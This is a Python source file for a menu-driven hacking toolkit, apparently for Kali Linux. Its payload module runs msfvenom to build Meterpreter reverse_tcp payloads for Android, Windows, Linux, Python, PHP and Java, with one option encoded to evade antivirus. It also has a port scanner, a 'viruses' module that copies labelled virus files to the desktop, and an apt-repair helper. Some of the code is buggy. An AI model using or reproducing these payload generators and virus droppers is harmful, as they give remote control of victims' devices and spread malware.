import os
import socket
import subprocess
from time import sleep
red='\033[1;91m'
blue='\033[1;94m'
green='\033[1;92m'
yellow='\033[1;93m'
blue='\033[1;94m'
white='\033[1;97m'
#                                Module 1
def Payloads(gen):
        sleep(1)
        print ('Initiallizing Payloads room, please fill this options')
        sleep(1)
        pum1=input(green+'Payloads|---> ')
        pum=int(pum1)
        if pum==1:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name (.apk): ')
           os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=%s lport=%s -o %s'%(lhost,lport,name))
           print (green+'Payload generated with msfvenom')
        elif pum==2:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name (.exe): ')
           os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=%s lport=%s -o %s'%(lhost,lport,name))
           print (green+'Payload generated with msfvenom')

        elif pum==3:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name (.exe): ')
           os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=%s lport=%s -e x86/shikata_ga_nai -o %s'%(lhost,lport,name))
           print (green+'Encrypted Payload generated with msfvenom')
        elif pum==4:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name : ')
           os.system('msfvenom -p linux/meterpreter/reverse_tcp lhost=%s lport=%s -o %s'%(lhost,lport,name))
           print (green+'Payload generated with msfvenom')
        elif pum==5:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name (.py): ')
           os.system('msfvenom -p python/meterpreter/reverse_tcp lhost=%s lport=%s -o %s'%(lhost,lport,name))
           print (green+'Payload generated with msfvenom')
        elif pum==6:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name (.php): ')
           os.system('msfvenom -p php/meterpreter/reverse_tcp lhost=%s lport=%s -o %s'%(lhost,lport,name))
           print (green+'Payload generated with msfvenom')
        elif pum==7:
           lhost=input(blue+'Enter your IP: ')
           lport=input(blue+'Enter a PORT(4444): ')
           name=input (yellow+'Enter your payload name (.java): ')
           os.system('msfvenom -p java/meterpreter/reverse_tcp lhost=%s lport=%s -o %s'%(lhost,lport,name))
           print (green+'Payload generated with msfvenom')
        elif pum==8:
           from menumodule import stm
           stm('')
        else:
           print (red+'Not Found ',pum)
        return Payloads(gen)


#    Module 2
def portscanner(s):
     sleep(1)
     print ('Initiallizing Port Scanner room, Please be patient...')
     sleep(1)
     m1=input ('PortScanner|---> ')
     m=int(m1)
     if m==1:
        m1=input ('Enter your IP to start: ')
        print (' To stop auto-scan press CTRL+C')
        sleep(1)
        print ('Starting...')
        sleep(0.5)
        try:
           for port in range (0,5000):
               s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               if s.connect_ex((m1,port))==0:
                   print (green+'Port %s is Open'%port)
               else:
                   print (red+'Port %s is Close'%port)
        except KeyboardInterrupt():
               return portscanner(s)
     elif m==2:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        ip=input ('Enter your IP: ')
        while (1):
           a=input ('Enter your PORT to scan: ')
           if s.connect_ex((ip,a))==0:
              print (green+'Port %s is Open'%a)
           else:
              print (red+'Port %s is Close'%a)
     elif m==3:
        try:
         portss=input (yellow+'Enter your port: ')
         print (socket.getservbyport(portss))
        except socket.gaierror():
         print (red+'Service for port %s is not known'%portss)
     elif m==4:
         try:
            ki=input (green+'Enter your DNS: ')
            socket.gethostbyname(ki)
         except socket.error():
            print (red+'DNS is incorrect or network connection is not available')
     elif m==5:
         from menumodule import stm
         stm('')
     else:
         print (red+'Not found ',m)
     return portscanner(s)
#        module 3
def viruses(gen):
     sleep(1)
     print ('Initiazllizing Viruses room, please be patient...')
     sleep(1)
     n1=input('Viruses|---> ')
     n=int(n1)
     if n==1:
        mk=input (green+'Enter the virus name (.py) : ')
        os.system('cp data/c /root/Desktop/%s'%mk)
     elif n==2:
        mk=input (green+'Enter the virus name (.py) : ')
        os.system('cp data/rm /root/Desktop/%s'%mk)
     elif n==3:
        mk=input (green+'Enter the virus name (.py) : ')
        os.system('cp data/crm /root/Desktop/%s'%mk)
     elif n==4:
        from menumodule import stm
        stm('')
     else:
        print (red+'Not found ',n)
#          module 4
def fixes(sys):
     sleep(1)
     print ('Initiallizing Fixes room, please be patient')
     l1=input ('Fix-system|---> ')
     l=int(l1)
     if l==1:
        print (green+'Copy this 2 links and paste it in this file')
        sleep(1)
        htt=white+'''
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib
'''
        print (htt)
        print ('Press enter to open file, paste links and save')
        input()
        os.system('nano /etc/apt/sources.list')
        print ('Fixed')
     elif l==2:
        print (green+'Copy this 2 links and paste it in this file')
        sleep(1)
        htt=white+'''
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib
'''  
        print (htt)
        print ('Press enter to open file, paste it and save')
        input()
        os.system('nano etc/apt/sources.list')
        print ('Fixed')
     elif l==3:
        os.system('apt update&&apt full-upgrade')
        os.system('clear')
        print (green+'Updated')
     elif l==4:
        from menumodule import stm
        stm('')
     else:
        print (red+'Not found ',l)
     return fixes(sys)
